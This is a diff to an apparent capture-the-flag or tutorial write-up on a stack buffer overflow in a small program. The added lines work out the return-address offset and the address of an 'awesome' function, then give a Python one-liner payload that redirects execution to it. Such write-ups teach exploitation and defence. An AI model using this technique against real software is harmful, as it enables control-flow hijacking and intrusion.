@@ -27,7 +27,10 @@ awesomeness.zip `SHA1: 5f42ea4a320cbfa206badffb6677a85e305ce781`
 `400664:	c9                   	leaveq`  
 `400665:	c3                   	retq`  
 Where the third line tells us 32 bytes is reserved for a variable.
-3. Derive that one needs to override 32 bytes + rbp to overwrite return address.
+3. Derive that one needs to override 32 bytes + rbp to overwrite return address.  
+4. Also derive address of `awesome` function is `400666`.
+Final command to assuming machine uses little-endian:
+`python -c 'print "a" * 40 + "\x66\x06\x40"' | ./awesomeProg`
 
 ## Recommended Reads
 * https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/
